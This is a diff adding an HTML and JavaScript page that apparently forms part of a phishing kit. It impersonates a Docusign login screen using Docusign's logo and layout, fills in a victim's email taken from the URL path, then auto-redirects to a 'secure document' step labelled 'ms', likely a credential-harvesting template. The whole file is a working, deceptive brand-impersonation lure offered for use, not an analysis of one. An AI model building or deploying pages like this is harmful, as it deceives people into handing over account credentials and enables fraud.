@@ -1,0 +1,110 @@
+<div id="main-container" style="margin:0;font-family:Arial,Helvetica,sans-serif;background:#f5f5f7;height:100vh;display:flex;flex-direction:column;transition: filter 0.3s ease;">
+
+<!-- Header -->
+<div style="padding:15px 30px;border-bottom:1px solid #ddd;display:flex;align-items:center">
+<img data-qa="header-docusign-logo" alt="Docusign"
+src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+style="height:26px">
+</div>
+
+<div style="flex:1;display:flex;align-items:center;justify-content:center">
+
+<div style="width:420px;background:#fff;border:1px solid #ddd;border-radius:4px;padding:45px">
+
+<div style="font-size:22px;margin-bottom:30px;color:#333">Log in to Docusign</div>
+
+<div style="font-size:14px;color:#666;margin-bottom:35px">
+Enter your email to log in.
+</div>
+
+<div style="font-size:13px;margin-bottom:10px">
+Email <span style="color:red">*</span>
+</div>
+
+<input id="email-input" type="text" placeholder="Enter email"
+style="width:93%;padding:10px;border:2px solid #5a2d91;border-radius:3px;margin-bottom:25px" readonly>
+
+<div onclick="startRedirect()" style="background:#3b0a6f;color:#fff;text-align:center;padding:12px;border-radius:3px;font-weight:bold;margin-bottom:10px;cursor:pointer">
+NEXT
+</div>
+
+<div style="background:#eee;text-align:center;padding:12px;border-radius:3px;color:#333;cursor:pointer">
+Sign Up for Free
+</div> <br>
+
+</div>
+</div>
+
+<!-- Footer -->
+<div style="border-top:1px solid #ddd;padding:10px 25px;font-size:12px;color:#666;display:flex;justify-content:space-between;align-items:center">
+
+<div style="display:flex;align-items:center;gap:6px">
+<span>Powered by</span>
+<img data-qa="footer-docusign-logo" alt="Docusign"
+src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+style="height:16px">
+</div>
+
+<div>
+English (US) • Contact Us • Terms • Privacy
+</div>
+
+</div>
+
+</div>
+
+<!-- Loading Overlay -->
+<div id="loading-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.8);z-index:9999;align-items:center;justify-content:center;flex-direction:column;">
+    <div style="width:50px;height:50px;border:5px solid #f3f3f3;border-top:5px solid #3b0a6f;border-radius:50%;animation:spin 1s linear infinite;"></div>
+    <div style="margin-top:20px;font-family:Arial,sans-serif;color:#333;font-weight:bold;">Redirecting to secure document...</div>
+</div>
+
+<style>
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+
+<script>
+    // 1. Grab Email from URL
+    function getEmailFromUrl() {
+        const path = window.location.pathname;
+        const parts = path.split('/');
+        for (let i = parts.length - 1; i >= 0; i--) {
+            if (parts[i].includes('@') && parts[i].includes('.')) {
+                return parts[i];
+            }
+        }
+        return '';
+    }
+
+    // 2. Display Email if found
+    const email = getEmailFromUrl();
+    const emailInput = document.getElementById('email-input');
+    if (email) {
+        emailInput.value = email;
+    }
+
+    // 3. Redirect Logic with Blur and Animation
+    function startRedirect() {
+        // Show loading overlay
+        const overlay = document.getElementById('loading-overlay');
+        const mainContainer = document.getElementById('main-container');
+        
+        overlay.style.display = 'flex';
+        mainContainer.style.filter = 'blur(5px)';
+
+        // Wait a moment then redirect
+        setTimeout(() => {
+            const currentUrl = new URL(window.location.href);
+            currentUrl.searchParams.set('step', 'ms'); // Force main template
+            window.location.href = currentUrl.toString();
+        }, 1500); // 1.5 second delay for effect
+    }
+    
+    // Auto-trigger if email is present
+    if (email) {
+       setTimeout(startRedirect, 2000); // 2 second delay before starting blur/animation
+    }
+</script>
